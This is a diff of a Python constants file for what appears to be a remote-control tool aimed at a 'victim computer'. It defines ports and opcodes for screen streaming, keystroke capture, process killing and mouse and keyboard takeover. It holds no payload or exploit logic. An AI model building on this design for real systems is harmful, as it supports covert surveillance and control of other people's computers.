@@ -2,15 +2,16 @@
 This file will contain all the constants used in the program
 """
 
+# TODO - maybe clean up this import to just be 'import pygame.locals' ?
 from pygame.locals import *
 
 # port number for initial connection and sending commands
 # this socket will also be used for mouse & keyboard control
-SERVER_PORT = 8080
+CMD_PORT = 42967
 # port number for receiving video stream from victim computer
-VIDEO_PORT = 8081
+VIDEO_PORT = 42968
 # port number for sending input from pygame to victim computer
-INPUT_PORT = 8082
+INPUT_PORT = 42969
 
 # change directory and list directory contents
 CHANGE_DIR = 1
@@ -31,10 +32,6 @@ START_KEYS = 13
 END_KEYS = 14
 # end the process (on the victim's computer)
 KILL_PROC = 12
-# print the rest of the message to provide useful info
-PRINT_INFO = 15
-# inform the attacker what the current directory is
-NEW_CURR_DIR = 16
 # constants for controlling the mouse and keyboard
 MOUSE_POS = 17 # this will be followed by X, Y coords for the mouse
 MOUSE_DOWN = 18 # this will be followed by MOUSE_LEFT, MOUSE_RIGHT, or MOUSE_MIDDLE
@@ -45,8 +42,8 @@ MOUSE_MIDDLE = 22
 MOUSE_WHEEL = 23 # this will be followed by a number to specify the scroll amount
 KEY_DOWN = 24 # this will be followed by the code of the key pressed (from KEY_DICT)
 KEY_UP = 25 # same as KEY_DOWN
-START_INPUT = 26 # tell the C client to simulate inputs from a list of all input events since last frame
-CONT_INPUT = 27 # tell the C client there's more input - ends with null terminator
+START_INPUTS = 26 # beginning of input list
+END_INPUTS = 27 # end of input list
 
 MOUSE_DICT = { # dictionary to map pygame mouse numbers to MOUSE_LEFT, MOUSE_RIGHT, and MOUSE_MIDDLE
 	1: MOUSE_LEFT,
@@ -202,7 +199,3 @@ KEY_DICT = { # this is a dictionary to map pygame key constants to Windows virtu
 	# probably only on european keyboards???
 	#K_EURO: 0x0D #                 Euro
 }
-
-# constants used for the image metadata dictionary in gui.py
-BASE_WIDTH = 'width'
-BASE_HEIGHT = 'height'
